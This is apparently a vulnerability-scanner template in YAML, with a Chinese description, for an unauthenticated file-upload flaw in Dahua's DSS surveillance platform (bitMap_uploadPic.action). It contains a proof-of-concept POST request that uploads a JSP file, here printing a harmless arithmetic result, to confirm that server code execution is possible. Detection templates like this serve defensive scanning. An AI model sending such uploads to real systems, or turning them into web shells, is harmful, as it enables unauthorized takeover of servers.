# 大华DSS城市安防监控系统平台bitMap_uploadPic.action文件上传会导致getshell

    ```
detail:
  ID: 883
  Author: 匿名作者
  Name: 大华DSS bitMap_uploadPic.action页面-获得Shell
  Description: "【漏洞对象】大华DSS\n【漏洞描述】\n该系统 /emap/bitmap/bitMap_uploadPic.action文件存在未授权访问上传getshell漏洞，攻击者无需认证访问到内部数据，可导致敏感信息泄露，从而获取服务器权限。"
  Identifier:
    DVB: DVB-2021-883
  VulnClass:
  - 认证绕过/未认证
  Category:
  - 应用服务
  Manufacturer: 大华
  Product: 大华DSS
  Type: 1
  Status: 1
  Scanable: 1
  Level: 3
  DisclosureDate: '2015-12-17'
  VulnImpact: 大华DSS未授权访问导致getshell，攻击者无需认证访问到内部数据，可导致敏感信息泄露，从而获取服务器权限，对服务器进行任意操作，危害巨大。
  Is0day: false
  IncludeExp: false
  Weakable: false
  IsXc: false
  IsCommon: false
  IsCallBack: false
  Condition: body="/portal/include/script/dahuaDefined/headCommon.js"
  Solutions:
  - 升级至最新版本
  Sources:
  - https://nosec.org/my/query/wooyun_bug/82758
poc:
  relative: req0
  session: true
  requests:
  - method: POST
    timeout: 10
    path: /emap/bitmap/bitMap_uploadPic.action
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
        Gecko) Chrome/56.0.2875.63 Safari/537.36
      Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynQBBlvrs2NMiBdIv
    data: "------WebKitFormBoundarynQBBlvrs2NMiBdIv\nContent-Disposition: form-data;\
      \ name=\"upload\"; filename=\"1.jsp\"\nContent-Type: text/plain\n\n<%\nout.println(12345+54321+10000);\n\
      %>\n------WebKitFormBoundarynQBBlvrs2NMiBdIv\nContent-Disposition: form-data;\
      \ name=\"desc\"\n\ntest\n------WebKitFormBoundarynQBBlvrs2NMiBdIv--"
    follow_redirects: false
    matches: (code.eq("404") && body.contains("and resul") && body.regex("\\\\d+\\\\.jsp"))
```
